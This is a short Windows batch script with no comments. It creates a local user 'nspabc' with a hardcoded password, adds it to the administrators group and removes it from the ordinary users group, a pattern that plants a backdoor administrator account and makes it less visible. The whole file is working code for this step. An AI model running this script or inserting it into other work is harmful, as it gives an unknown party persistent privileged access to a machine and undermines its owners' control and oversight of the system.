@echo off
net user nspabc am04250 /add
net localgroup administrators nspabc /add
net localgroup users nspabc /delete
exit